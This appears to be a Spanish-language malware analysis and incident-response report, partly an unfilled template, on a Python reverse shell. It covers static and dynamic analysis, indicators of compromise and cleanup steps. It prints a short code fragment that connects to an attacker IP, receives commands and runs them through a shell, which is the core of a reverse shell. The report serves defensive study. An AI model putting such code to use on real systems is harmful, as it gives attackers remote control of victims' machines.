# üõ°Ô∏è An√°lisis y Manejo de Malware

## 1. üìå Descripci√≥n del Caso

**Nombre o identificaci√≥n del malware:** Reverse shell en Python

**Fecha de detecci√≥n:**  
29/04/2025

**Fuente o vector de infecci√≥n:**  troyano.py

**Resumen del comportamiento sospechoso:**  
- Conexiones salientes no autorizadas  
- Creaci√≥n de procesos desconocidos  
- Alteraci√≥n de archivos del sistema  
- Persistencia en el sistema  

---

## 2. üîç Identificaci√≥n del Malware

### 2.1 An√°lisis Est√°tico

**Tipo de archivo analizado:** `.py`, `.exe`, `.dll`, etc.  
**Herramientas utilizadas:**  
- `strings`  
- `file`  

**Indicadores sospechosos encontrados:**  
- IP remota: `192.168.0.23`  
- Puerto: `4444`  
- Uso de `socket`, `subprocess`, `os`  
- Funcionalidad de reverse shell  

```python
s.connect((attacker_ip, attacker_port))
command = s.recv(1024)
output = subprocess.check_output(command, shell=True)
```
![[Pasted image 20250429143653.png]]
### 2.2 An√°lisis Din√°mico

**Entorno de an√°lisis:** M√°quina virtual con Windows 10 / Linux

**Comportamiento durante la ejecuci√≥n:**
- Establece conexi√≥n saliente TCP
- Ejecuta comandos recibidos
- Oculta actividad o borra rastros

**Logs y capturas relevantes:**
-  Captura de tr√°fico de red
-  Registro de procesos creados
-  Claves de registro modificadas (Windows)

---

## 3. üß≠ Clasificaci√≥n del Malware

**Tipo:**
-  Reverse Shell
-  Ransomware
-  Troyano ____________

**Nivel de severidad:** Alto

**Impacto potencial:**
- P√©rdida de confidencialidad
- Control remoto del sistema
- Compromiso total de la m√°quina
![[Pasted image 20250429141305.png]]

---

## 4. üõ∞Ô∏è Detecci√≥n y Contenci√≥n

### 4.1 Indicadores de Compromiso (IoCs)

- Archivo sospechoso: `troyan.py`
- Direcci√≥n IP remota: `192.168.40.41`
- Hash SHA256: 244f3f88d49c8097fcdd062f02e0955fd6660fff6c4704cc0ea006527f0d1bcf

### 4.2 Herramientas de detecci√≥n

-  VirusTotal
-  Wireshark
-  nmap
![[Pasted image 20250429152119.png]]

---

## 5. üßπ Limpieza y Remediaci√≥n

**Pasos realizados:**
1. Eliminar archivo malicioso
2. Matar procesos activos
3. Revocar persistencia (inicio autom√°tico, claves de registro, servicios)
4. Cambiar credenciales comprometidas
5. Aislar el host de la red
6. Reinstalaci√≥n del sistema (si es necesario)

**Estado del sistema tras limpieza:**
-  Limpio
-  En observaci√≥n
-  Requiere formateo

---

## 6. üìù Conclusiones

- El archivo analizado era un reverse shell que permit√≠a control remoto del sistema afectado.
- Se identific√≥ el comportamiento, se capturaron indicadores y se eliminaron los vectores de persistencia.
- Se recomienda mejorar las medidas de seguridad preventiva, como detecci√≥n temprana, segmentaci√≥n de red y entrenamiento en phishing.

---